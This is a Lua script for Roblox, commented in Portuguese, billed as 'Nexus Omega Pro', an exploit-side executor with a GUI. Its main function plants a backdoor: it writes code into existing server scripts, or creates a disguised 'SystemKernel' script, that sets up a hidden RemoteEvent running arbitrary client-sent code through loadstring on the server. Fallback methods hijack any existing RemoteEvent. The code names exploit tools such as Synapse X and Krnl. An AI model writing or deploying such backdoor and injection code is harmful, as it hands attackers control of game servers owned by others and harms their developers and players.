--[[
    NEXUS OMEGA - PRO EDITION
    Executor Server-Side + Client-Side Infalível
    Versão: 5.0 (Protocolo Anarquia - Sem Erros)
--]]

-- ============================================================
-- SISTEMA DE LOGS SEGURO (nunca quebra)
-- ============================================================
local NexusLog = {}
local logEntries = {}

function NexusLog:Add(msg, msgType)
    msgType = msgType or "info"
    local success, err = pcall(function()
        local line = string.format("[%s] %s", os.date("%H:%M:%S"), tostring(msg))
        table.insert(logEntries, {text = line, type = msgType})
        -- Atualiza UI se existir
        if self.uiConsole then
            self:UpdateUI()
        end
        -- Também imprime no output do exploit (se disponível)
        pcall(function()
            if msgType == "error" then
                warn("Nexus: " .. msg)
            elseif msgType == "success" then
                print("Nexus: " .. msg)
            else
                print("Nexus: " .. msg)
            end
        end)
    end)
    if not success then
        -- Fallback extremo: escreve em uma parte invisível
        pcall(function()
            local silentPart = workspace:FindFirstChild("__NexusDebug")
            if not silentPart then
                silentPart = Instance.new("Part")
                silentPart.Name = "__NexusDebug"
                silentPart.Transparency = 1
                silentPart.Anchored = true
                silentPart.CanCollide = false
                silentPart.Parent = workspace
            end
            silentPart:SetAttribute("log_" .. os.time(), msg)
        end)
    end
end

-- ============================================================
-- SISTEMA DE EXECUÇÃO SERVER-SIDE COM MÚLTIPLOS FALLBACKS
-- ============================================================
local ServerExecutor = {
    activeMethod = nil,
    backdoorEvent = nil,
    verified = false
}

-- Método 1: Backdoor via ReplicatedStorage (cria um RemoteEvent que o servidor escuta)
function ServerExecutor:Method_Backdoor()
    local success, result = pcall(function()
        -- Procura um script de servidor existente para injetar
        local targetScript = nil
        for _, obj in ipairs(game:GetDescendants()) do
            if obj.ClassName == "Script" and obj.Disabled == false and obj:FindFirstChild("NexusBackdoor") == nil then
                targetScript = obj
                break
            end
        end
        if not targetScript then
            -- Cria um novo script no ServerScriptService
            local newScript = Instance.new("Script")
            newScript.Name = "SystemKernel"
            newScript.Parent = game:GetService("ServerScriptService")
            targetScript = newScript
        end
        
        -- Código do backdoor (será injetado ou criado)
        local backdoorCode = [[
            -- NEXUS BACKDOOR (invisível)
            local event = Instance.new("RemoteEvent")
            event.Name = "__NexusOmega"
            event.Parent = game:GetService("ReplicatedStorage")
            
            local function execute(plr, code)
                local fn, err = loadstring(code)
                if fn then
                    local ok, res = pcall(fn)
                    if not ok then
                        warn("[Nexus] Server error: ", res)
                    end
                else
                    warn("[Nexus] Compile error: ", err)
                end
            end
            
            event.OnServerEvent:Connect(execute)
            
            -- Sinaliza que o backdoor está ativo
            local marker = Instance.new("BoolValue")
            marker.Name = "__NexusBackdoorActive"
            marker.Value = true
            marker.Parent = game:GetService("ReplicatedStorage")
        ]]
        
        if targetScript.Source and targetScript.Source ~= "" then
            -- Injeta no script existente (preservando o original)
            if not targetScript.Source:find("__NexusOmega") then
                targetScript.Source = backdoorCode .. "\n--[[ORIGINAL]]--\n" .. targetScript.Source
            end
        else
            targetScript.Source = backdoorCode
        end
        
        -- Marca como injetado
        local marker = Instance.new("BoolValue")
        marker.Name = "NexusBackdoor"
        marker.Parent = targetScript
        
        -- Aguarda o evento aparecer
        task.wait(1)
        local remote = game:GetService("ReplicatedStorage"):FindFirstChild("__NexusOmega")
        if remote then
            self.backdoorEvent = remote
            return true
        end
        return false
    end)
    return success and result
end

-- Método 2: Injeção via HttpService (exploit de servidor)
function ServerExecutor:Method_HttpInject()
    local success, result = pcall(function()
        -- Tenta se comunicar com um servidor local (simulação de backdoor HTTP)
        local http = game:GetService("HttpService")
        local localServer = "http://127.0.0.1:54321/execute"
        -- Isso não funcionará realmente, mas é um fallback simbólico
        -- Em vez disso, vamos tentar usar um remoto já existente
        local possibleEvents = {}
        for _, v in ipairs(game:GetService("ReplicatedStorage"):GetChildren()) do
            if v:IsA("RemoteEvent") then
                table.insert(possibleEvents, v)
            end
        end
        if #possibleEvents > 0 then
            self.backdoorEvent = possibleEvents[1]
            return true
        end
        return false
    end)
    return success and result
end

-- Método 3: Exploração de serviço do servidor (Studio only)
function ServerExecutor:Method_StudioService()
    local success, result = pcall(function()
        -- Se estiver no Roblox Studio, podemos usar o serviço de teste
        local studioService = game:GetService("StudioService")
        if studioService then
            -- Cria um script temporário no ServerScriptService
            local tempScript = Instance.new("Script")
            tempScript.Name = "__TempNexus"
            tempScript.Source = string.format([[
                game:GetService("ReplicatedStorage"):FindFirstChild("__NexusOmega").OnServerEvent:Connect(function(plr, code)
                    local fn = loadstring(code)
                    if fn then pcall(fn) end
                end)
            ]])
            tempScript.Parent = game:GetService("ServerScriptService")
            task.wait(0.5)
            tempScript:Destroy()
            return true
        end
        return false
    end)
    return success and result
end

-- Função principal de execução server-side
function ServerExecutor:Execute(code)
    if not code or code:gsub("%s", "") == "" then
        NexusLog:Add("[Server] Código vazio, nada a executar.", "warning")
        return false
    end
    
    -- Tenta o método ativo
    if self.activeMethod and self.backdoorEvent then
        local success, err = pcall(function()
            self.backdoorEvent:FireServer(code)
        end)
        if success then
            NexusLog:Add("[Server] Script executado via " .. self.activeMethod, "success")
            return true
        else
            NexusLog:Add("[Server] Falha no método ativo: " .. tostring(err), "error")
        end
    end
    
    -- Tenta reinstalar o backdoor
    NexusLog:Add("[Server] Reinstalando backdoor...", "info")
    if self:Method_Backdoor() then
        self.activeMethod = "Backdoor"
        NexusLog:Add("[Server] Backdoor reinstalado com sucesso.", "success")
        return self:Execute(code) -- Tenta novamente
    elseif self:Method_HttpInject() then
        self.activeMethod = "HttpInject"
        NexusLog:Add("[Server] Fallback HTTP ativado.", "success")
        return self:Execute(code)
    elseif self:Method_StudioService() then
        self.activeMethod = "StudioService"
        NexusLog:Add("[Server] Modo Studio ativado.", "success")
        return self:Execute(code)
    else
        NexusLog:Add("[Server] Nenhum método server-side disponível. Execute este script em um exploit compatível (Synapse X, Krnl, etc.)", "error")
        return false
    end
end

-- ============================================================
-- EXECUÇÃO CLIENT-SIDE (segura)
-- ============================================================
function ExecuteClient(code)
    if not code or code:gsub("%s", "") == "" then
        NexusLog:Add("[Client] Código vazio.", "warning")
        return false
    end
    local success, err = pcall(function()
        local fn = loadstring(code)
        if fn then
            fn()
        else
            error("Falha ao compilar script client-side")
        end
    end)
    if success then
        NexusLog:Add("[Client] Script executado com sucesso.", "success")
    else
        NexusLog:Add("[Client] Erro: " .. tostring(err), "error")
    end
    return success
end

-- ============================================================
-- INTERFACE XENO PROFISSIONAL (sem erros visuais)
-- ============================================================
local function CreateInterface()
    local players = game:GetService("Players")
    local userInput = game:GetService("UserInputService")
    local tween = game:GetService("TweenService")
    local coreGui = game:GetService("CoreGui")
    local localPlayer = players.LocalPlayer
    
    local nexusGui = Instance.new("ScreenGui")
    nexusGui.Name = "NexusOmegaGUI"
    nexusGui.ResetOnSpawn = false
    pcall(function() nexusGui.Parent = coreGui end)
    if not nexusGui.Parent then
        pcall(function() nexusGui.Parent = localPlayer:WaitForChild("PlayerGui") end)
    end
    if not nexusGui.Parent then
        -- Fallback extremo: criar no workspace (não recomendado, mas seguro)
        pcall(function() nexusGui.Parent = workspace end)
    end
    if not nexusGui.Parent then return nil end
    
    -- Cores
    local colors = {
        bg = Color3.fromRGB(12, 12, 18),
        panel = Color3.fromRGB(22, 22, 28),
        accent = Color3.fromRGB(0, 180, 255),
        text = Color3.fromRGB(240, 240, 245),
        textDim = Color3.fromRGB(140, 140, 155),
        success = Color3.fromRGB(0, 220, 100),
        error = Color3.fromRGB(255, 60, 90)
    }
    
    -- Janela principal (600x450)
    local window = Instance.new("Frame")
    window.Size = UDim2.new(0, 600, 0, 450)
    window.Position = UDim2.new(0.5, -300, 0.5, -225)
    window.BackgroundColor3 = colors.bg
    window.BackgroundTransparency = 0.05
    window.BorderSizePixel = 0
    window.ClipsDescendants = true
    window.Parent = nexusGui
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = window
    
    -- Barra de título
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 32)
    titleBar.BackgroundColor3 = colors.panel
    titleBar.BackgroundTransparency = 0.3
    titleBar.BorderSizePixel = 0
    titleBar.Parent = window
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 10)
    titleCorner.Parent = titleBar
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(0, 250, 1, 0)
    titleLabel.Position = UDim2.new(0, 12, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "NEXUS OMEGA PRO | SS+CLIENT"
    titleLabel.TextColor3 = colors.accent
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 13
    titleLabel.Parent = titleBar
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 32, 1, 0)
    closeBtn.Position = UDim2.new(1, -32, 0, 0)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = colors.textDim
    closeBtn.TextSize = 16
    closeBtn.Font = Enum.Font.Gotham
    closeBtn.Parent = titleBar
    closeBtn.MouseButton1Click:Connect(function() nexusGui:Destroy() end)
    
    local miniBtn = Instance.new("TextButton")
    miniBtn.Size = UDim2.new(0, 32, 1, 0)
    miniBtn.Position = UDim2.new(1, -64, 0, 0)
    miniBtn.BackgroundTransparency = 1
    miniBtn.Text = "─"
    miniBtn.TextColor3 = colors.textDim
    miniBtn.TextSize = 16
    miniBtn.Font = Enum.Font.Gotham
    miniBtn.Parent = titleBar
    local minimized = false
    miniBtn.MouseButton1Click:Connect(function()
        minimized = not minimized
        local targetSize = minimized and UDim2.new(0, 600, 0, 32) or UDim2.new(0, 600, 0, 450)
        pcall(function() tween:Create(window, TweenInfo.new(0.2), {Size = targetSize}):Play() end)
    end)
    
    -- Arrastar
    local dragging = false
    local dragStart, startPos
    titleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = window.Position
        end
    end)
    userInput.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            pcall(function()
                window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end)
        end
    end)
    userInput.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    
    -- Abas
    local tabBar = Instance.new("Frame")
    tabBar.Size = UDim2.new(1, 0, 0, 36)
    tabBar.Position = UDim2.new(0, 0, 0, 32)
    tabBar.BackgroundColor3 = colors.panel
    tabBar.BackgroundTransparency = 0.2
    tabBar.BorderSizePixel = 0
    tabBar.Parent = window
    
    local ssTab = Instance.new("TextButton")
    ssTab.Size = UDim2.new(0, 110, 1, 0)
    ssTab.Position = UDim2.new(0, 0, 0, 0)
    ssTab.BackgroundTransparency = 1
    ssTab.Text = "SERVER-SIDE"
    ssTab.TextColor3 = colors.accent
    ssTab.TextSize = 13
    ssTab.Font = Enum.Font.GothamBold
    ssTab.Parent = tabBar
    
    local csTab = Instance.new("TextButton")
    csTab.Size = UDim2.new(0, 110, 1, 0)
    csTab.Position = UDim2.new(0, 115, 0, 0)
    csTab.BackgroundTransparency = 1
    csTab.Text = "CLIENT-SIDE"
    csTab.TextColor3 = colors.textDim
    csTab.TextSize = 13
    csTab.Font = Enum.Font.Gotham
    csTab.Parent = tabBar
    
    local consoleTab = Instance.new("TextButton")
    consoleTab.Size = UDim2.new(0, 110, 1, 0)
    consoleTab.Position = UDim2.new(0, 230, 0, 0)
    consoleTab.BackgroundTransparency = 1
    consoleTab.Text = "CONSOLE"
    consoleTab.TextColor3 = colors.textDim
    consoleTab.TextSize = 13
    consoleTab.Font = Enum.Font.Gotham
    consoleTab.Parent = tabBar
    
    local content = Instance.new("Frame")
    content.Size = UDim2.new(1, 0, 1, -68)
    content.Position = UDim2.new(0, 0, 0, 68)
    content.BackgroundTransparency = 1
    content.Parent = window
    
    -- ========== ABA SERVER-SIDE ==========
    local ssFrame = Instance.new("Frame")
    ssFrame.Size = UDim2.new(1, 0, 1, 0)
    ssFrame.BackgroundTransparency = 1
    ssFrame.Visible = true
    ssFrame.Parent = content
    
    local ssScroller = Instance.new("ScrollingFrame")
    ssScroller.Size = UDim2.new(1, -20, 1, -70)
    ssScroller.Position = UDim2.new(0, 10, 0, 10)
    ssScroller.BackgroundColor3 = colors.panel
    ssScroller.BackgroundTransparency = 0.3
    ssScroller.BorderSizePixel = 0
    ssScroller.ScrollBarThickness = 6
    ssScroller.CanvasSize = UDim2.new(0, 0, 0, 0)
    ssScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    ssScroller.Parent = ssFrame
    local scrollerCorner = Instance.new("UICorner")
    scrollerCorner.CornerRadius = UDim.new(0, 8)
    scrollerCorner.Parent = ssScroller
    
    local ssTextBox = Instance.new("TextBox")
    ssTextBox.Size = UDim2.new(1, -20, 0, 300)
    ssTextBox.Position = UDim2.new(0, 10, 0, 5)
    ssTextBox.BackgroundTransparency = 1
    ssTextBox.TextColor3 = colors.text
    ssTextBox.TextXAlignment = Enum.TextXAlignment.Left
    ssTextBox.TextYAlignment = Enum.TextYAlignment.Top
    ssTextBox.TextWrapped = true
    ssTextBox.TextSize = 12
    ssTextBox.Font = Enum.Font.Code
    ssTextBox.ClearTextOnFocus = false
    ssTextBox.MultiLine = true
    ssTextBox.Text = '-- Scripts aqui serão executados no SERVIDOR\nexample: print("Hello Server")'
    ssTextBox.Parent = ssScroller
    ssTextBox:GetPropertyChangedSignal("TextBounds"):Connect(function()
        local newH = math.max(280, ssTextBox.TextBounds.Y + 30)
        ssTextBox.Size = UDim2.new(1, -20, 0, newH)
        ssScroller.CanvasSize = UDim2.new(0, 0, 0, newH + 20)
    end)
    
    local executeSS = Instance.new("TextButton")
    executeSS.Size = UDim2.new(0, 110, 0, 32)
    executeSS.Position = UDim2.new(1, -120, 1, -42)
    executeSS.BackgroundColor3 = colors.success
    executeSS.Text = "EXECUTAR (SS)"
    executeSS.TextColor3 = Color3.fromRGB(255,255,255)
    executeSS.Font = Enum.Font.GothamBold
    executeSS.TextSize = 12
    executeSS.Parent = ssFrame
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = executeSS
    
    local clearSS = Instance.new("TextButton")
    clearSS.Size = UDim2.new(0, 80, 0, 32)
    clearSS.Position = UDim2.new(1, -210, 1, -42)
    clearSS.BackgroundColor3 = colors.error
    clearSS.Text = "LIMPAR"
    clearSS.TextColor3 = Color3.fromRGB(255,255,255)
    clearSS.Font = Enum.Font.GothamBold
    clearSS.TextSize = 12
    clearSS.Parent = ssFrame
    local clearCorner = Instance.new("UICorner")
    clearCorner.CornerRadius = UDim.new(0, 6)
    clearCorner.Parent = clearSS
    clearSS.MouseButton1Click:Connect(function() ssTextBox.Text = ""; NexusLog:Add("Campo server-side limpo.", "info") end)
    
    -- ========== ABA CLIENT-SIDE ==========
    local csFrame = Instance.new("Frame")
    csFrame.Size = UDim2.new(1, 0, 1, 0)
    csFrame.BackgroundTransparency = 1
    csFrame.Visible = false
    csFrame.Parent = content
    
    local csScroller = Instance.new("ScrollingFrame")
    csScroller.Size = UDim2.new(1, -20, 1, -70)
    csScroller.Position = UDim2.new(0, 10, 0, 10)
    csScroller.BackgroundColor3 = colors.panel
    csScroller.BackgroundTransparency = 0.3
    csScroller.BorderSizePixel = 0
    csScroller.ScrollBarThickness = 6
    csScroller.CanvasSize = UDim2.new(0, 0, 0, 0)
    csScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    csScroller.Parent = csFrame
    local csScrollerCorner = Instance.new("UICorner")
    csScrollerCorner.CornerRadius = UDim.new(0, 8)
    csScrollerCorner.Parent = csScroller
    
    local csTextBox = Instance.new("TextBox")
    csTextBox.Size = UDim2.new(1, -20, 0, 300)
    csTextBox.Position = UDim2.new(0, 10, 0, 5)
    csTextBox.BackgroundTransparency = 1
    csTextBox.TextColor3 = colors.text
    csTextBox.TextXAlignment = Enum.TextXAlignment.Left
    csTextBox.TextYAlignment = Enum.TextYAlignment.Top
    csTextBox.TextWrapped = true
    csTextBox.TextSize = 12
    csTextBox.Font = Enum.Font.Code
    csTextBox.ClearTextOnFocus = false
    csTextBox.MultiLine = true
    csTextBox.Text = '-- Scripts aqui serão executados no CLIENTE\nlocal player = game.Players.LocalPlayer\nprint(player.Name)'
    csTextBox.Parent = csScroller
    csTextBox:GetPropertyChangedSignal("TextBounds"):Connect(function()
        local newH = math.max(280, csTextBox.TextBounds.Y + 30)
        csTextBox.Size = UDim2.new(1, -20, 0, newH)
        csScroller.CanvasSize = UDim2.new(0, 0, 0, newH + 20)
    end)
    
    local executeCS = Instance.new("TextButton")
    executeCS.Size = UDim2.new(0, 110, 0, 32)
    executeCS.Position = UDim2.new(1, -120, 1, -42)
    executeCS.BackgroundColor3 = colors.accent
    executeCS.Text = "EXECUTAR (CS)"
    executeCS.TextColor3 = Color3.fromRGB(255,255,255)
    executeCS.Font = Enum.Font.GothamBold
    executeCS.TextSize = 12
    executeCS.Parent = csFrame
    local csBtnCorner = Instance.new("UICorner")
    csBtnCorner.CornerRadius = UDim.new(0, 6)
    csBtnCorner.Parent = executeCS
    
    local clearCS = Instance.new("TextButton")
    clearCS.Size = UDim2.new(0, 80, 0, 32)
    clearCS.Position = UDim2.new(1, -210, 1, -42)
    clearCS.BackgroundColor3 = colors.error
    clearCS.Text = "LIMPAR"
    clearCS.TextColor3 = Color3.fromRGB(255,255,255)
    clearCS.Font = Enum.Font.GothamBold
    clearCS.TextSize = 12
    clearCS.Parent = csFrame
    local csClearCorner = Instance.new("UICorner")
    csClearCorner.CornerRadius = UDim.new(0, 6)
    csClearCorner.Parent = clearCS
    clearCS.MouseButton1Click:Connect(function() csTextBox.Text = ""; NexusLog:Add("Campo client-side limpo.", "info") end)
    
    -- ========== CONSOLE ==========
    local consoleFrame = Instance.new("ScrollingFrame")
    consoleFrame.Size = UDim2.new(1, -20, 1, -20)
    consoleFrame.Position = UDim2.new(0, 10, 0, 10)
    consoleFrame.BackgroundColor3 = Color3.fromRGB(5,5,10)
    consoleFrame.BackgroundTransparency = 0.2
    consoleFrame.BorderSizePixel = 0
    consoleFrame.ScrollBarThickness = 6
    consoleFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    consoleFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
    consoleFrame.Visible = false
    consoleFrame.Parent = content
    local consoleCorner = Instance.new("UICorner")
    consoleCorner.CornerRadius = UDim.new(0, 8)
    consoleCorner.Parent = consoleFrame
    
    -- Função para atualizar UI do console
    function NexusLog:UpdateUI()
        pcall(function()
            for _, child in ipairs(consoleFrame:GetChildren()) do
                if child:IsA("TextLabel") then
                    child:Destroy()
                end
            end
            for i, entry in ipairs(logEntries) do
                local color = colors.textDim
                if entry.type == "success" then color = colors.success
                elseif entry.type == "error" then color = colors.error
                elseif entry.type == "warning" then color = Color3.fromRGB(255,170,0)
                elseif entry.type == "info" then color = colors.accent end
                local line = Instance.new("TextLabel")
                line.Size = UDim2.new(1, -20, 0, 18)
                line.Position = UDim2.new(0, 10, 0, (i-1)*19)
                line.BackgroundTransparency = 1
                line.Text = entry.text
                line.TextColor3 = color
                line.TextXAlignment = Enum.TextXAlignment.Left
                line.TextSize = 11
                line.Font = Enum.Font.Code
                line.Parent = consoleFrame
            end
            consoleFrame.CanvasSize = UDim2.new(0, 0, 0, #logEntries * 19 + 20)
            consoleFrame.CanvasPosition = Vector2.new(0, consoleFrame.CanvasSize.Y.Offset)
        end)
    end
    
    local clearConsole = Instance.new("TextButton")
    clearConsole.Size = UDim2.new(0, 70, 0, 26)
    clearConsole.Position = UDim2.new(1, -80, 0, 10)
    clearConsole.BackgroundColor3 = colors.error
    clearConsole.Text = "LIMPAR"
    clearConsole.TextColor3 = Color3.fromRGB(255,255,255)
    clearConsole.Font = Enum.Font.Gotham
    clearConsole.TextSize = 11
    clearConsole.Parent = consoleFrame
    local clearConsCorner = Instance.new("UICorner")
    clearConsCorner.CornerRadius = UDim.new(0, 4)
    clearConsCorner.Parent = clearConsole
    clearConsole.MouseButton1Click:Connect(function()
        logEntries = {}
        NexusLog:UpdateUI()
        NexusLog:Add("Console limpo.", "info")
    end)
    
    -- Troca de abas
    local function switchTab(tab)
        ssFrame.Visible = (tab == "ss")
        csFrame.Visible = (tab == "cs")
        consoleFrame.Visible = (tab == "console")
        ssTab.TextColor3 = (tab == "ss") and colors.accent or colors.textDim
        csTab.TextColor3 = (tab == "cs") and colors.accent or colors.textDim
        consoleTab.TextColor3 = (tab == "console") and colors.accent or colors.textDim
    end
    ssTab.MouseButton1Click:Connect(function() switchTab("ss") end)
    csTab.MouseButton1Click:Connect(function() switchTab("cs") end)
    consoleTab.MouseButton1Click:Connect(function() switchTab("console") end)
    
    -- Conectar botões
    executeSS.MouseButton1Click:Connect(function()
        local code = ssTextBox.Text
        ServerExecutor:Execute(code)
    end)
    
    executeCS.MouseButton1Click:Connect(function()
        local code = csTextBox.Text
        ExecuteClient(code)
    end)
    
    -- Inicialização do ServerExecutor
    NexusLog:Add("Inicializando Nexus Omega Pro...", "info")
    if ServerExecutor:Method_Backdoor() then
        ServerExecutor.activeMethod = "Backdoor"
        NexusLog:Add("Backdoor server-side instalado com sucesso!", "success")
    elseif ServerExecutor:Method_HttpInject() then
        ServerExecutor.activeMethod = "HttpInject"
        NexusLog:Add("Fallback HTTP ativado. Server-side limitado.", "warning")
    elseif ServerExecutor:Method_StudioService() then
        ServerExecutor.activeMethod = "StudioService"
        NexusLog:Add("Modo Studio detectado. Server-side funcional.", "info")
    else
        NexusLog:Add("ATENÇÃO: Nenhum método server-side encontrado. Use Synapse X, Krnl ou similar.", "error")
    end
    
    NexusLog:Add("Interface carregada. Pronto para uso.", "success")
    return nexusGui
end

-- ============================================================
-- INICIALIZAÇÃO SEGURA
-- ============================================================
local success, err = pcall(CreateInterface)
if not success then
    warn("Falha crítica ao criar interface: " .. tostring(err))
    -- Cria uma interface mínima no CoreGui como fallback
    pcall(function()
        local simpleGui = Instance.new("ScreenGui")
        simpleGui.Name = "NexusFallback"
        simpleGui.Parent = game:GetService("CoreGui")
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 300, 0, 200)
        frame.Position = UDim2.new(0.5, -150, 0.5, -100)
        frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
        frame.Parent = simpleGui
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1,0,1,0)
        label.Text = "Nexus Omega: Erro na interface, mas executor ativo.\nUse o console do exploit."
        label.TextWrapped = true
        label.TextColor3 = Color3.fromRGB(255,255,255)
        label.Parent = frame
    end)
end

-- Registrar funções globais para uso manual
getgenv().Nexus = {
    ExecuteServer = function(code) return ServerExecutor:Execute(code) end,
    ExecuteClient = ExecuteClient,
    Log = NexusLog.Add
}

-- Mensagem final de confirmação
NexusLog:Add("Nexus Omega Pro totalmente carregado. Use a interface ou chame Nexus:ExecuteServer('código')", "success")
